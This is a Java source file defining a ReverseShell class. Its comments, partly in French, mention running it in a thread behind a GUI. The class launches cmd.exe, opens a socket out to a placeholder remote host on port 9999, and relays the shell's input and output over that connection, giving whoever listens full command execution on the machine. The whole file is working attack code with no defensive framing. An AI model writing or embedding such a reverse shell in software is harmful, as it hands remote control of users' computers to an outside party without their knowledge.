package util;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
/*
 * We run the class in a Thread to not freeze the main gui 
 * 
 * Ouvrir les ports dans son routeur si on doit faire marcher le logiciel en public
 */

public class ReverseShell extends Thread {
	String host = "XX.XX.XX.XX"; // gobal IP
	// String host = "192.168.2.54";
	int port = 9999;
	String cmd = "cmd.exe";
	Thread t;
	
	public ReverseShell(String name) {
		super(name);
		this.start();
	}
	
	public void run() {
		try {
			Process p =new ProcessBuilder(cmd).redirectErrorStream(true).start();
			Socket s =new Socket(host,port);
			InputStream pi =p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
			OutputStream po =p.getOutputStream(),so=s.getOutputStream();
			while(!s.isClosed()) {
				while(pi.available()>0)
					so.write(pi.read());
				while(pe.available()>0)
					so.write(pe.read());
				while(si.available()>0)
					po.write(si.read());
				so.flush();
				po.flush();
				Thread.sleep(50);
				try {
					p.exitValue();
					break;
				}
				catch (Exception e){
				}
			};
			p.destroy();
			s.close();
		} catch(Exception e) {
			System.out.println(e);
		}
	}
	
	
}
